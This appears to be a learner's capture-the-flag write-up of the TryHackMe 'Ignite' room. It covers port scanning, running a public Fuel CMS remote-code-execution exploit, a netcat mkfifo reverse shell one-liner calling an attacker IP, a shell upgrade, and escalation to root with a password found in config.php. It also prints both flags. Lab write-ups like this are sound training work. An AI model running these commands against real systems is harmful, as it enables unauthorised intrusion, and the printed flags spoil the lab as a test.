**ROOM LINK :** https://tryhackme.com/room/ignite 


Target IP : 10.201.22.56

## 🧠 Overview

Ignite was a chill box. Started with some light web recon, spotted a CMS, and used a known exploit to get in. After that, a bit of digging around led me to an easy privilege escalation. Straightforward overall, but good practice. :


## 🔍 Recon

Started with a full port scan using nmap 

```
nmap -sV -sS -T4 -p- <IP>
```

<img width="1286" height="301" alt="Screenshot 2025-08-02 234033" src="https://github.com/user-attachments/assets/6904ebbd-b292-41e2-aa92-67ab56abcb3f" />

Found HTTP open on port 80,running Apache httpd 2.4.18 ((Ubuntu))


## 🕵️‍♂️ Vulnerability ?

<img width="1699" height="947" alt="Screenshot 2025-08-02 234520" src="https://github.com/user-attachments/assets/b5ae5837-32f0-484a-813e-6fcda8236c1d" />

Fuel CMS v1.4 was running on the http server and it is a preety known vulnerability which can be exploited by Remote code execution.


## 💥 Exploitation


Once I confirmed the site was running Fuel CMS, I looked up known vulnerabilities and found a remote code execution (RCE) exploit for Fuel CMS version <= 1.4.1.

```
searchsploit fuel cms
```
<img width="1870" height="294" alt="Screenshot 2025-08-02 234544" src="https://github.com/user-attachments/assets/d9a1bdf3-6966-4714-aa36-d6ff0d4c38c6" />

```
searchsploit -m linux/webapps/47138.py
``` 


<img width="764" height="201" alt="Screenshot 2025-08-02 235133" src="https://github.com/user-attachments/assets/ab3dce31-cb37-42eb-aef6-a94ab1c24f6a" />

here the command ``` -m ``` saved our time by downloading the RCE payload from EXPLOIT-DB(no need to manually copy it from the website)


Now lets go through our payload and do some changes


<img width="1073" height="776" alt="Screenshot 2025-08-03 000123" src="https://github.com/user-attachments/assets/d192df2f-05a8-4b80-aae9-9220fb701eb5" />


1)Here I updated the url to our target ip http://<IP>


2)Rmoved the proxy payload as I was not using burpsuite for this machine because I didn’t need to intercept the traffic.


3)To check if the exploit was actually sending requests and getting a valid response, I added:


```
r = requests.get(burp0_url)
```

## 🧨 Payload Execution 
Now lets execute the payload 

Just make sure you have a Netcat listener ready before running the reverse shell:

```
nc -lvnp 4444
```

```
python3 47138.py http://<IP>

```

Alrigt we got our output 

we didnt get any reverse shell here we can see **CMD**

It's just a label in the script's output, showing what command was issued.

To bypass this I copied a netcat revershell command from pentest monkey 

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER IP> 4444 > /tmp/f
```

<img width="1209" height="112" alt="Screenshot 2025-08-03 003305" src="https://github.com/user-attachments/assets/c138785c-4dd1-4f3b-b8b9-463b41b95ece" />


rm /tmp/f; mkfifo /tmp/f: Removes any existing pipe, then creates a new named pipe.

cat /tmp/f | /bin/sh -i: Sets up a shell to read from the pipe.


Less goo,we got the reverse shell


<img width="650" height="128" alt="Screenshot 2025-08-03 003314" src="https://github.com/user-attachments/assets/9e93e390-9ef7-41dc-b5aa-503acd114a13" />



**First of all lets upgrade the shell**

The initial reverse shell was limited — no TTY, no proper terminal control. To fix that, I upgraded the shell using Python:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 🔍 Post-Exploit Enumeration


Now lets go through the target machine and Find the flags


I found the User.txt flag in /home/www-data


www-data is a low priviledge user system


<img width="895" height="644" alt="Screenshot 2025-08-03 004410" src="https://github.com/user-attachments/assets/453c542a-418c-43eb-9b3d-e2e5c6eb25e8" />


**6470e394cbf6dab6a91682cc8585059b**

After this I began exploring fuel directory in which I found an application directory which was hiding a config.php and that config.php was containing some privacy stuff like root password etc.


<img width="1438" height="830" alt="Screenshot 2025-08-03 005804" src="https://github.com/user-attachments/assets/3a4243aa-bbf4-46a4-bbc1-74625d478960" />



After finding the password I changed my user to root 


```
su root
```

**Finally now I am a root user**

Now I have to claim the root flag


<img width="508" height="216" alt="Screenshot 2025-08-03 010539" src="https://github.com/user-attachments/assets/bd9cf03d-e23b-4a02-9482-b1568280eb2c" />


**b9bbcb33e11b80be759c4e844862482d**

## ❌ Mistakes & What to Avoid

I initially over-relied on walkthroughs for small stuck points. I’ll now try harder to debug before peeking.

Forgot to stabilize my shell early, which made copying files and navigating harder. Always stabilize right after you get in.

## 🧠 What I Learned

Got more fluent with reading exploit code, knowing which parts are optional (like Burp proxy) and which are required (target URL, payload).

This box taught me to look at running services and users post-exploit. Finding the fuel user gave a clear direction for privesc.

## ✅ Conclusion

 I fumbled a bit with the shell handling and missed a few basic enum steps early on,but will keep that in mind for future machines.
 Overall, it helped me tighten up my process and reminded me not to rush through steps just to get the root flag.















